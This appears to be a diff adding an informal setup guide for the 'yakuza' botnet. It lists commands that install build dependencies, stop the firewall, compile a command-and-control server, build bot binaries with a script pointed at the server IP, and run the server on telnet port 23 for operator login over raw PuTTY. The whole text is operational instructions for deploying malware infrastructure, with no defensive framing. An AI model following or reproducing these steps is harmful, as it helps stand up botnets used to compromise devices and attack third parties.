@@ -1,0 +1,20 @@
+Edit the yakuza.c file							 
+
+                                 yum install python-paramiko nano screen gcc perl wget lbzip unzip -y
+Make Sure u do this ive already ran the cmd^^^^^^^^^^^^^^^^
+
+service httpd restart 
+service iptables stop                  
+
+gcc server.c -o server -pthread
+
+python yakuza.py yakuza.c SERVER IP
+
+
+
+screen ./server 23 1 9956
+                    You Pick the screen port
+
+NOW PRESS CRTL A+D
+
+LOGIN WITH PUTTY RAW PORT = SCREENPORT
